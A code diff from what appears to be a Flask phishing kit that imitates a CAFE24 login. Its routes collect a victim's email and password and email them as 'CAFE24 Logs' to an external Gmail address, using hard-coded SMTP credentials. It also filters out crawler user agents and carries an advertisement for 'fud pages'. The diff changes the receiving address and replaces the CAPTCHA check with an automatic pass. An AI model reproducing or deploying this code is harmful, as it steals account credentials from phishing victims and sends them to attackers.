@@ -82,7 +82,7 @@ bot_user_agents = [
     'curl',
     'spider',
     'crawler',
-    ]
+]
 
 
 @app.route('/', methods=['GET', 'POST'])
@@ -92,51 +92,28 @@ def captcha():
         if session.get('passed_captcha'):
             return redirect(url_for('success', web=session.get('eman')))
 
-        # Generate a random 4-digit CAPTCHA code
-        code = random.randint(1000, 9999)
-        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
-        color = random.choice(colors)
-        session['code'] = str(code)
-
-        # Handle 'web' parameter safely
+        # Generate session values without CAPTCHA
         userauto = request.args.get('web', 'default@example.com')
         userdomain = userauto.split('@')[-1] if '@' in userauto else 'unknown'
-
-        # Store data in session
+        
         session['eman'] = userauto
         session['ins'] = userdomain
-
-        # Render the CAPTCHA template
-        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
+        
+        # Bypass CAPTCHA and redirect
+        session['passed_captcha'] = True
+        return redirect(url_for('success', web=session.get('eman')))
 
     elif request.method == 'POST':
-        # Retrieve the code entered by the user
-        user_input = request.form.get('code')
+        # Automatically pass the CAPTCHA check
+        session['passed_captcha'] = True
+        return redirect(url_for('success', web=session.get('eman')))
 
-        # Check if the entered code matches the stored CAPTCHA code
-        if user_input == session.get('code'):
-            session['passed_captcha'] = True
-            return redirect(url_for('success', web=session.get('eman')))
-        else:
-            # Generate a new CAPTCHA code on failure
-            code = random.randint(1000, 9999)
-            color = random.choice(['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9'])
-            session['code'] = str(code)
-
-            # Reuse the session values to avoid inconsistency
-            return render_template(
-                'captcha.html', 
-                code=code, 
-                color=color, 
-                eman=session['eman'], 
-                ins=session['ins'], 
-                error=True
-            )
 
 @app.route('/success')
 def success():
     web_param = request.args.get('web', 'No web param')
     return redirect(url_for('route2', web=web_param))
+
 
 @app.route("/route2")
 def route2():
@@ -161,15 +138,14 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'cafe24@guide-level.com'
         sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
+        receiver_email = 'bcjung0071@gmail.com'
         password = 'Xr)pMsLFuvv.'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'CAFE24 Logs !'
         message['From'] = sender_email
         message['To'] = receiver_email
-        text = \
-            """\
+        text = """\
         Hi,
         How are you?
         contact me on icq jamescartwright for your fud pages
@@ -202,15 +178,14 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'cafe24@guide-level.com'
         sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
+        receiver_email = 'bcjung0071@gmail.com'
         password = 'Xr)pMsLFuvv.'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'CAFE24 logs !! '
         message['From'] = sender_email
         message['To'] = receiver_email
-        text = \
-            """\
+        text = """\
         Hi,
         How are you?
         contact me on icq jamescartwright for your fud pages
@@ -248,6 +223,7 @@ def lasmo():
     if request.method == 'GET':
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=3000)
